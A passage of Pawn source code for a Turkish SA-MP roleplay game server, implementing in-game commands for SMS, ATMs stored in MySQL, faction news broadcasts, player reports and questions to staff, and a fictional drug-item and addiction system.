			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		if(isnull(result)) return Kullanim(playerid, "/sms [numara] [mesaj]");
	    TelefonMesajGonder(playerid, num, result);
	    OnPlayerCommandPerformed(playerid,"/ame telefonunu eline alýr ve mesaj yazmaya baþlar.",0);
        return 1;
    }
	if(!strcmp(string, "/sinyalekle", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
		    string = strtok(cmdtext, idx);
		    if(!strlen(string))return Kullanim(playerid, "/sinyalekle [mesafe]");
		    new Float:mesafe = floatstr(string);
		    if(!(10.0 < mesafe < 200.0))return Hata(playerid,"Mesafe 10.0 ila 200.0 arasýnda olmalýdýr.");
		    Hata(playerid, "Þuanda inaktiftir.");
		    return 1;
		}
	    return 1;
	}
	if(strcmp(string, "/atm", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araç içinde bu komutu kullanamazsýnýz.");
	    for(new adm; adm < MAX_ATM; adm++)
	    {
	        if(ATM[adm][atmx] != 0 && ATM[adm][atmy] != 0 && ATM[adm][atmz] != 0)
	        {
		        if(IsPlayerInRangeOfPoint(playerid, 2.0, ATM[adm][atmx], ATM[adm][atmy], ATM[adm][atmz]))
		        {
		            if(Karakter[playerid][hesapno] == 0)
		            {
		                Hata(playerid, "Banka hesabýnýz yok.");
					}
					else
					{
						format(string,sizeof(string),"{FFFFFF}Hoþgeldiniz!\nHesap No: %d\nHesabýnýzda Bulunan Para Miktarý: %d",Karakter[playerid][hesapno],BankaPara(playerid));
						ShowPlayerDialog(playerid, 127, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Banka", string, "Ýleri", "Kapat");
					}
					break;
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/atmekle", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
			new Float:atX,Float:atY,Float:atZ, query[1024];
			GetPlayerPos(playerid, atX, atY, atZ);
			format(query, sizeof(query), "INSERT INTO `atm` (`x`, `y`, `z`) VALUES ('%f', '%f', '%f')", atX, atY, atZ);
			new Cache:cache = mysql_query(query,true);
			new i = cache_insert_id();
			cache_delete(cache);
			ATM[i][atmid] = i;
			ATM[i][atmx] = atX;
			ATM[i][atmy] = atY;
			ATM[i][atmz] = atZ;
			ATM[i][atmint] = GetPlayerInterior(playerid);
			ATM[i][atmvw] = GetPlayerVirtualWorld(playerid);
			ATM[i][atmobje] = CreateDynamicObject(19324, ATM[i][atmx], ATM[i][atmy], ATM[i][atmz], 0, 0, 0, ATM[i][atmvw], ATM[i][atmint], -1, 500.0);
			EditDynamicObject(playerid, ATM[i][atmobje]);
			SetPVarInt(playerid, "atmobje", 1);
			SetPVarInt(playerid, "atmidmiz", ATM[i][atmid]);
			Bilgi(playerid, "ATM objesinin yerini ayarlayýn.");
	    }
		return 1;
	}
	if(strcmp(string, "/atmid", true) == 0)
	{
		if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
		{
		    for(new t = 0; t < MAX_ATM; t++)
		    {
		        if(IsPlayerInRangeOfPoint(playerid, 3.0, ATM[t][atmx], ATM[t][atmy], ATM[t][atmz]))
				{
				    format(string, sizeof(string), "atmID: %d", t);
				    Bilgi(playerid, string);
				}
		    }
		}
		return 1;
	}
	if(strcmp(string, "/atmduzenle", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
				Kullanim(playerid, "/atmduzenle [atmID]");
				return 1;
	        }
	        if(strval(string) < 1 || strval(string) > MAX_ATM)
	        {
	            return 1;
			}
			SetPVarInt(playerid, "atmobje", 1);
			SetPVarInt(playerid, "atmidmiz", ATM[strval(string)][atmid]);
			EditDynamicObject(playerid, ATM[strval(string)][atmid]);
			Bilgi(playerid, "ATM'yi düzenlemeye baþladýnýz.");
	    }
	    return 1;
	}
	if(strcmp(string, "/atmsil", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
	        new query[256];
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/atmsil [atmID]");
	            return 1;
			}
			if(strval(string) < 1 || strval(string) > MAX_ATM)
			{
			    return 1;
			}
			ATM[strval(string)][atmx] = 0;
			ATM[strval(string)][atmy] = 0;
			ATM[strval(string)][atmz] = 0;
			DestroyDynamicObject(ATM[strval(string)][atmobje]);
			format(query, sizeof(query), "DELETE FROM `atm` WHERE `id` = '%d'", strval(string));
			mysql_tquery(1,query);
			Bilgi(playerid, "ATM baþarýyla silindi.");
	    }
	    return 1;
	}
	if(strcmp(string, "/yayinkapat", true) == 0 || strcmp(string, "/tognews", true) == 0)
	{
	    if(Yayin[playerid])
	    {
	        Yayin[playerid] = 0;
	        StopAudioStreamForPlayer(playerid);
	        Bilgi(playerid, "Yayýn kapatýldý. Komutu tekrar ederek yayýný açabilirsiniz.");
	    }
	    else
	    {
	        Yayin[playerid] = 1;
	        Bilgi(playerid, "Yayýn açýldý. Komutu tekrar ederek yayýný kapatabilirsiniz.");
	    }
	    return 1;
	}
	if(!strcmp(string, "/muzikyayin", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
	    {
	        if(Karakter[playerid][rutbe] > 2 && Birlik[Karakter[playerid][birlik]][ftip] == SANTV) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/muzikyayin [url]");
			}
			Bilgi(playerid, string);
   			if(Yayin[playerid] == 1) {
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(Yayin[i]) PlayAudioStreamForPlayer(i, string);
				}
			}
		}
	    return 1;
	}
	if(!strcmp(string, "/muzikdurdur", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        for(new i; i < MAX_PLAYERS; i++) StopAudioStreamForPlayer(i);
	    }
	    return 1;
	}
	if(!strcmp(string, "/yayin", true))
	{
	    if(IsPlayerConnected(playerid))
	    {
	    if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
	    {
	        if(Karakter[playerid][rutbe] > 7 && Birlik[Karakter[playerid][birlik]][ftip] == SANTV) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
			new ylength = strlen(cmdtext);
			while ((idx < ylength) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new yoffset = idx;
			new yresult[256];
			while ((idx < ylength) && ((idx - yoffset) < (sizeof(yresult) - 1)))
			{
				yresult[idx - yoffset] = cmdtext[idx];
				idx++;
			}
			yresult[idx - yoffset] = EOS;
			if(!strlen(yresult))
			{
				Kullanim(playerid,"/yayin [mesaj]");
				Ipucu(playerid, "Bu komut mesajýnýzý tüm sunucuya gönderir.");
				return 1;
			}
			if(strlen(yresult) > 80)
			{
	 			new ytoxt[3][256];
				TextBol(yresult,ytoxt,80);
				format(string, sizeof(string), "[%s] %s: %s ...", Birlik[Karakter[playerid][birlik]][fisim],OyuncuAdiniBul(playerid), ytoxt[0]);
				YayinGonder(COLOR_ORANGE, string);
				format(string, sizeof(string), "... %s", ytoxt[1]);
				YayinGonder(COLOR_ORANGE, string);
			    return 1;
			}
			format(string, sizeof(string), "[%s] %s: %s", Birlik[Karakter[playerid][birlik]][fisim],OyuncuAdiniBul(playerid), yresult);
			YayinGonder(COLOR_ORANGE, string);
	    }
	    }
	    return 1;
	}

	if(!strcmp(string, "/yayincik", true))
	{
	    if(Yayinda[playerid])
	    {
	        Yayinda[playerid] = 0;
	        Bilgi(playerid, "Baþarýyla yayýndan ayrýldýnýz.");
	    }
	    else Hata(playerid, "Herhangi bir yayýnda deðilsiniz.");
	    return 1;
	}

	if(!strcmp(string, "/yayindavet", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
	    {
	        if(Karakter[playerid][rutbe] > 7 && Birlik[Karakter[playerid][birlik]][ftip] == SANTV) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
	        string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/yayindavet [playerid]");
				return 1;
			}
			new giveplayerid = strval(string);
			if(Girdi[giveplayerid] && !Yayinda[giveplayerid])
			{
			    Yayinda[giveplayerid] = 1;
			    if(giveplayerid == playerid)
				{
				    Bilgi(playerid, "Canlý yayýyýný baþlattýnýz.");
				}
				else
				{
				    format(string, sizeof(string), "%s sizi canlý yayýna aldý.", OyuncuAdiniBul(playerid));
				    Bilgi(giveplayerid, string);
				    format(string, sizeof(string), "%s adlý oyuncuyu baþarýyla canlý yayýna aldýnýz.", OyuncuAdiniBul(giveplayerid));
				    Bilgi(playerid, string);
				    SetPVarInt(giveplayerid, "CanliYayinID", Karakter[playerid][birlik]);
				}
			}
			else Hata(playerid, "Böyle bir oyuncu bulunamadý ya da oyuncu zaten yayýnda.");
	    }
	    return 1;
	}
    if(!strcmp(string, "/yayincikar", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
	    {
	        string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/yayincikar [playerid]");
				return 1;
			}
			new giveplayerid = strval(string);
			if(Girdi[giveplayerid] && Yayinda[giveplayerid])
			{
  				Yayinda[giveplayerid] = 0;
   				format(string, sizeof(string), "%s sizi canlý yayýndan çýkardý.", OyuncuAdiniBul(playerid));
				Bilgi(giveplayerid, string);
				format(string, sizeof(string), "%s adlý oyuncuyu canlý yayýndan çýkardýnýz.", OyuncuAdiniBul(giveplayerid));
				Bilgi(playerid, string);
			}
			else Hata(playerid, "Böyle bir oyuncu bulunamadý ya da oyuncu yayýnda deðil.");
	    }
	    return 1;
	}
	if(!strcmp(string, "/sorular", true) || !strcmp(string, "/srlr", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 || Karakter[playerid][tester] >= 1)
		{
			new mstring[2048];
			for(new i;i<MAX_PLAYERS;i++)
			{
			    if(Karakter[i][Soru] >= 1)
			    {
			    	format(mstring, sizeof(mstring), "%s"C2"%s["C1"%d"C2"]\n",mstring, OyuncuAdiniBul(i), i);
				}
			}
			ShowPlayerDialog(playerid, 292, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Soru", mstring, "Seç", "Ýptal");
			if(isnull(mstring)) Hata(playerid, "Herhangi bir soru bulunmamaktadýr.");
			return 1;
		}
		return 1;
	}
	if(!strcmp(string, "/soru", true) || !strcmp(string, "/sorusor", true))
	{
	    if(!Girdi[playerid]) return 1;
	    if(TesterSay() == 0 && YonetimSay() == 0) return Hata(playerid, "Þuanda aktif destek ekibi üyesi bulunmamaktadýr.");
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[128];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
       	if(!strlen(result))
        {
		     Kullanim(playerid, "/soru [sorunuz]");
		}
		else
		{
			if(Karakter[playerid][Soru] >= 1)
			{
				Hata(playerid, "Sistemimize kayýtlý aktif bir sorunuz var, iptal etmek için: /soruiptal");
			}
			else
			{
			    Bilgi(playerid, "Sorunuzu baþarýyla gönderdiniz. Sorunuzu iptal etmek için /soruiptal yazýnýz.");
				for(new a; a<MAX_PLAYERS; a++)
				{
				    if(Karakter[a][tester] >= 1 && tDuty[a] == 1)
				    {
				        format(string,sizeof(string),"[SORU %d] - %s - %s",playerid,OyuncuAdiniBul(playerid),result);
						Bilgi(a, string);
					}
				}
				strcpy(Karakter[playerid][SoruMesaj], result, 256);
				Karakter[playerid][Soru] = 1;
			}
		}
		return 1;
	}
	if(!strcmp(string, "/raporlar", true) || !strcmp(string, "/rp", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
		{
			new mstring[2048];
			for(new i;i<MAX_PLAYERS;i++)
			{
			    if(Karakter[i][Rapor] >= 1)
			    {
			    	format(mstring, sizeof(mstring), "%s"C2"%s["C1"%d"C2"] - %s\n",mstring, OyuncuAdiniBul(i), i, Karakter[i][RaporTarih]);
				}
			}
			ShowPlayerDialog(playerid, 289, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Rapor", mstring, "Seç", "Ýptal");
			if(isnull(mstring)) Hata(playerid, "Herhangi bir rapor bulunmamaktadýr.");
		}
		return 1;
	}
	if(!strcmp(string, "/rapor", true))
	{
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[128];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
       	if(!strlen(result))
        {
		     Kullanim(playerid, "/rapor [rapor içeriði]");
		}
		else
		{
		    if(YonetimSay() == 0) return Hata(playerid, "Þuanda aktif yönetim ekibi üyesi bulunmamaktadýr.");
			if(Karakter[playerid][Rapor] >= 1)
			{
			    new mstring[148];
			    format(mstring, sizeof(mstring), "Sistemimize kayýtlý aktif bir raporunuz var, iptal etmek için: /raporiptal. Rapor sýranýz: %d", RaporSira(playerid));
				Hata(playerid, mstring);
			}
			else
			{
			    new hour,minuite,second;
	 			gettime(hour,minuite,second);
	 			format(Karakter[playerid][RaporTarih], 64, "%d:%d", hour, minuite);
			    strcpy(Karakter[playerid][RaporMesaj], result, 256);
				Karakter[playerid][Rapor] = 1;
			    new mstring[148];
			    format(mstring, sizeof(mstring), "Raporunuzu baþarýyla gönderdiniz. Raporunuzu iptal etmek için /raporiptal yazýnýz. Rapor Sýranýz: %d", RaporSira(playerid));
			    Bilgi(playerid, mstring);
				for(new a; a<MAX_PLAYERS; a++)
				{
					if(Karakter[a][adminlevel] >= 1)
					{
	    	 		   	format(string,sizeof(string),"{c76400}[RAPOR] "C1"%s (%d) isimli oyuncu bir rapor gönderdi.",OyuncuAdiniBul(playerid),playerid);
						SendClientMessage(a, -1, string);
					}
				}
			}
		}
		return 1;
	}

	if(!strcmp(string, "/karakterduzenle", true) || !strcmp(string, "/kduzenle", true))
	{
	    if(Karakter[playerid][adminlevel] >= 4 && AKontrol(playerid))
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/k(arakter)duzenle [playerid]");
			    return 1;
			}
			new giveplayerid = strval(string);
			if(giveplayerid != INVALID_PLAYER_ID && IsPlayerConnected(giveplayerid))
			{
       			ShowKDuzenle(playerid, giveplayerid);
			    KDuzenleVar[playerid] = giveplayerid;
			}
			else Hata(playerid, "Böyle bir oyuncu bulunamamaktadýr.");
		}
	    return 1;
	}
	if(!strcmp(string, "/autedavi", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && AKontrol(playerid))
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/autedavi [oyuncuID]");
	            return 1;
	        }
	        new giveplayerid = strval(string);
			if(giveplayerid != INVALID_PLAYER_ID && IsPlayerConnected(giveplayerid))
			{
				Karakter[giveplayerid][bagimlimi] = 0;
				Karakter[giveplayerid][krizgeldimi] = 0;
				Bilgi(playerid, "Oyuncuyu baþarýyla baðýmlýlýktan kurtardýnýz.");
			}
			else Hata(playerid, "Hatalý bir oyuncuID girdiniz.");
	    }
	    else Hata(playerid, "Yönetici yetkileriniz bu komutu kapsamýyor veya yönetici deðilsiniz.");
		return 1;
	}
	if(!strcmp(string, "/usil", true))
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
			Bilgi(playerid, "Silmek istediðiniz saksýyý seçin. Ýþlemi iptal etmek için ESC tuþunu kullanýn.");
	    	SelectObject(playerid);
	    	SelectObjectTur[playerid] = 5;
		}
	    return 1;
	}
	if(!strcmp(string, "/utedavi", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/utedavi [oyuncuID]");
	            return 1;
	        }
			new giveplayerid = strval(string);
			if(giveplayerid != INVALID_PLAYER_ID && IsPlayerConnected(giveplayerid))
			{
			    if(ProxDetectorS(5.0, playerid, giveplayerid))
			    {
			        if(Karakter[giveplayerid][utedavidurum] == 0)
			        {
			            if(Karakter[giveplayerid][bagimlimi] >= 1)
			            {
			                TogglePlayerControllable(giveplayerid, 0);
			                Karakter[giveplayerid][utedavidurum] = 10000;
			                TogglePlayerControllable(playerid, 0);
			                SetTimerEx("TedaviYapiliyo", 20000, false, "uu", giveplayerid, playerid);
			                Bilgi(playerid, "Yakýnýnýzdaki oyuncuya uyuþturucu tedavisi yapmaya baþladýnýz.");
			                Bilgi(giveplayerid, "Uyuþturucu tedaviniz baþladý. Bu durum yaklaþýk olarak 5 dakika sürmektedir.");
			            }
			            else
			            {
			                Hata(playerid, "Bu oyuncu baðýmlý deðil.");
			            }
			        }
			        else
			        {
			            Hata(playerid, "Bu hastanýn tedavisi daha önceden yapýlmýþ durumda.");
			        }
			    }
			    else
			    {
			        Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
			    }
			}
			else
			{
			    Hata(playerid, "Hatalý bir oyuncuID girdiniz.");
			}
	    }
	    else
	    {
	        Hata(playerid, "Hastane birliðinde deðilsiniz.");
	    }
	    return 1;
	}
	if(!strcmp(string, "/uyusturucu", true))
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
		{
	 		Kullanim(playerid, "/uyusturucu [fonksiyon]");
	 		SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kullan, ver, sat, bilgi, evbirak, eval, evbilgi");
	 		SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: saksi, saksibirak, kaldir, tohumek, tohumver, bakim, topla");
	 		if(Birlik[Karakter[playerid][birlik]][ftip] == CETE || Birlik[Karakter[playerid][birlik]][ftip] == MC) SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kututasi, kutubirak, kutuiptal");
	 		return 1;
		}
		if(Buysa("kututasi",string))
		{
		    if(Birlik[Karakter[playerid][birlik]][ftip] != CETE && Birlik[Karakter[playerid][birlik]][ftip] != MC || !Girdi[playerid]) return 1;
		    if(Birlik[Karakter[playerid][birlik]][seviye] < 3) return Hata(playerid, "Birlik seviyeniz yeterli deðil. [Seviye 3]");
			if(Karakter[playerid][rutbe] >= 11) return Hata(playerid, "Bu komutu kullanma yetkiniz yok. [Rütbe 10 ve üstü]");
			if(!UKutuPos(playerid)) return Hata(playerid, "Kutu taþýma yerinde deðilsiniz.");
			if(!KutuSaat() && Karakter[playerid][adminlevel] < 6) return Hata(playerid, "Bu saatte kutu taþýyamazsýnýz.");
			if(UKutuTasiyor[playerid] != 0) return Hata(playerid, "Zaten þuanda kutu taþýmaktasýnýz.");
			ShowPlayerDialog(playerid, 277, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Kutu", "Esrar\nAmfetamin Haplarý\nMetamfetamin Haplarý\nLSD Haplarý\nExtacy Haplarý\nKokain\nEroin\nMorfin Ýlacý\nMDA Haplarý", "Taþý", "Ýptal");
		}
		else if(Buysa("kutubirak",string))
		{
		    if(Birlik[Karakter[playerid][birlik]][ftip] != CETE && Birlik[Karakter[playerid][birlik]][ftip] != MC || !Girdi[playerid]) return 1;
		    if(Birlik[Karakter[playerid][birlik]][seviye] < 3) return Hata(playerid, "Birlik seviyeniz yeterli deðil. [Seviye 3]");
			if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Kutu taþýmak için araçtan inmelisiniz.");
			new veh=GetNearestVehicle(playerid);
			if(!IsValidVehicle(veh)) return Hata(playerid, "Kutu taþýmak için aracýn yakýnýnda olmalýsýnýz.");
			if(!IsAMyBoat(veh)) return Hata(playerid, "Bu araca kutu býrakamazsýnýz.");
			if(UKutuTasiyor[playerid] == 0) return Hata(playerid, "Kutu taþýmýyorsunuz.");
			for(new i=0;i<sizeof(BotVerileri);i++) {
			    if(BotVerileri[i][0] == GetVehicleModel(veh)) {
					if(Kutular[veh] == BotVerileri[i][1]) return Hata(playerid, "Botun kutu taþýma kapasitesi dolmuþ.");
				}
			}
			switch(UKutuTasiyor[playerid])
			{
			    case 1: AUyusturucu[veh][esrar]++;
			    case 2: AUyusturucu[veh][amfetamin]++;
			    case 3: AUyusturucu[veh][metamfetamin]++;
			    case 4: AUyusturucu[veh][lsd]++;
			    case 5: AUyusturucu[veh][extacy]++;
			    case 6: AUyusturucu[veh][kokain]++;
			    case 7: AUyusturucu[veh][eroin]++;
			    case 8: AUyusturucu[veh][morfin]++;
			    case 9: AUyusturucu[veh][MDA]++;
			}
			ClearAnimations(playerid);
			SetPlayerSpecialAction(playerid,0);
			RemovePlayerAttachedObject(playerid, kindex[playerid]);
			UKutuTasiyor[playerid] = 0;
			Kutular[veh]++;
			Bilgi(playerid, "Kutuyu bota býraktýnýz.");
			return 1;
		}
		else if(Buysa("kutuiptal",string))
		{
		    if(Birlik[Karakter[playerid][birlik]][ftip] != CETE && Birlik[Karakter[playerid][birlik]][ftip] != MC || !Girdi[playerid]) return 1;
		    if(Birlik[Karakter[playerid][birlik]][seviye] < 3) return Hata(playerid, "Birlik seviyeniz yeterli deðil. [Seviye 3]");
			if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Kutu taþýmak için araçtan inmelisiniz.");
			if(UKutuTasiyor[playerid] == 0) return Hata(playerid, "Kutu taþýmýyorsunuz.");
			ClearAnimations(playerid);
			SetPlayerSpecialAction(playerid,0);
			RemovePlayerAttachedObject(playerid, kindex[playerid]);
			Bilgi(playerid, "Kutuyu yere býraktýnýz.");
			return 1;
		}
		else if(!strcmp(string, "kullan", true))
		{
		    new tmp[128];
		    tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        Kullanim(playerid, "/uyusturucu kullan [uyuþturucu çeþiti]");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: esrar, amfetamin, metamfetamin, lsd");
		        SendClientMessage(playerid, COLOR_WHITE, "Geçerli çeþitler: extacy, kokain, eroin, morfin, MDA");
				return 1;
			}
			if(!strcmp(tmp, "esrar", true))
			{
			    if(Karakter[playerid][uesrar] > 0)
			    {
			        Bilgi(playerid, "Esrar kullandýnýz.");
			        Karakter[playerid][uesrar]--;
			        if(Karakter[playerid][hp]+15 > 130) Karakter[playerid][hp] = 130;
			    	else SetPlayerHealth(playerid, Karakter[playerid][hp]+15);
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(marijuanahava));
					SetPlayerWeather(playerid,marijuanahava[rand][0]);
					SetPlayerTime(playerid,marijuanahava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);

				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli esrar bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "amfetamin", true))
			{
				if(Karakter[playerid][amfetamin] > 0)
				{
					Bilgi(playerid, "Amfetamin kullandýnýz.");
				    Karakter[playerid][amfetamin]--;
				    Karakter[playerid][bagimlimi] += 7;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(methhava));
					SetPlayerWeather(playerid,methhava[rand][0]);
					SetPlayerTime(playerid,methhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli amfetamin bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "metamfetamin", true))
			{
				if(Karakter[playerid][metamfetamin] > 0)
				{
					Bilgi(playerid, "Metamfetamin kullandýnýz.");
				    Karakter[playerid][metamfetamin]--;
				    Karakter[playerid][bagimlimi] += 8;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(methhava));
					SetPlayerWeather(playerid,methhava[rand][0]);
					SetPlayerTime(playerid,methhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli metamfetamin bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "lsd", true))
			{
				if(Karakter[playerid][lsd] > 0)
				{
					Bilgi(playerid, "LSD kullandýnýz.");
				    Karakter[playerid][lsd]--;
				    Karakter[playerid][bagimlimi] += 9;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(methhava));
					SetPlayerWeather(playerid,methhava[rand][0]);
					SetPlayerTime(playerid,methhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli LSD bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "extacy", true))
			{
				if(Karakter[playerid][extacy] > 0)
				{
     				if(Karakter[playerid][hp]+5 > 130) Karakter[playerid][hp] = 130;
			    	else SetPlayerHealth(playerid, Karakter[playerid][hp]+5);
					Karakter[playerid][bagimlimi] += 8;
					Bilgi(playerid, "Extacy kullandýnýz.");
				    Karakter[playerid][extacy]--;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(extacyhava));
					SetPlayerWeather(playerid,extacyhava[rand][0]);
					SetPlayerTime(playerid,extacyhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli extacy bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "kokain", true))
			{
				if(Karakter[playerid][kokain] > 0)
				{
				    if(Karakter[playerid][hp]+10 > 130) Karakter[playerid][hp] = 130;
			    	else SetPlayerHealth(playerid, Karakter[playerid][hp]+10);
					Karakter[playerid][bagimlimi] += 15;
					Bilgi(playerid, "Kokain kullandýnýz.");
				    Karakter[playerid][kokain]--;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(kokainhava));
					SetPlayerWeather(playerid,kokainhava[rand][0]);
					SetPlayerTime(playerid,kokainhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli kokain bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "eroin", true))
			{
				if(Karakter[playerid][eroin] > 0)
				{
				    if(Karakter[playerid][hp]+5 > 130) Karakter[playerid][hp] = 130;
			    	else SetPlayerHealth(playerid, Karakter[playerid][hp]+5);
				    Karakter[playerid][bagimlimi] += 7;
					Bilgi(playerid, "Eroin kullandýnýz.");
				    Karakter[playerid][eroin]--;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(eroinhava));
					SetPlayerWeather(playerid,eroinhava[rand][0]);
					SetPlayerTime(playerid,eroinhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli eroin bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "morfin", true))
			{
				if(Karakter[playerid][morfin] > 0)
				{
					Bilgi(playerid, "Morfin kullandýnýz.");
				    Karakter[playerid][morfin]--;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(eroinhava));
					SetPlayerWeather(playerid,eroinhava[rand][0]);
					SetPlayerTime(playerid,eroinhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli morfin bulunmamakta.");
				}
			}
			if(!strcmp(tmp, "mda", true))
			{
				if(Karakter[playerid][MDA] > 0)
				{
					Bilgi(playerid, "MDA kullandýnýz.");
				    Karakter[playerid][MDA]--;
					SetPlayerDrunkLevel(playerid,2000+(300*26));
					new rand = random(sizeof(eroinhava));
					SetPlayerWeather(playerid,eroinhava[rand][0]);
					SetPlayerTime(playerid,eroinhava[rand][1],0);
					UyusturucuEtkiVar[playerid] = SetTimerEx("UyusturucuEtki", 60000, 0, "i", playerid);
				}
				else
				{
					Hata(playerid, "Üzerinizde yeterli MDA bulunmamakta.");
				}
			}
		}
		else if(!strcmp(string, "evbilgi", true))
		{
		    new mesafe = EvIceridenMesafesi(playerid);
        	if(mesafe == 0) return Hata(playerid, "Evin içerisinde deðilsiniz.");
        	if(Ev[mesafe][esahip] != Karakter[playerid][sqlid] && Ev[mesafe][kiralayan] != Karakter[playerid][sqlid] && !EvAnahtarKontrol(playerid, mesafe)) return 1;
			SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Esrar: ["C2"%d"C1"] Amfetamin: ["C2"%d"C1"] Metamfetamin: ["C2"%d"C1"]", EvUyusturucu[mesafe][uesrar], EvUyusturucu[mesafe][amfetamin], EvUyusturucu[mesafe][metamfetamin]);
			SendClientMessageEx(playerid,-1, ""C2"[UYUÞTURUCULAR] "C1"LSD: ["C2"%d"C1"] Extacy: ["C2"%d"C1"] Kokain: ["C2"%d"C1"]", EvUyusturucu[mesafe][lsd], EvUyusturucu[mesafe][extacy], EvUyusturucu[mesafe][kokain]);
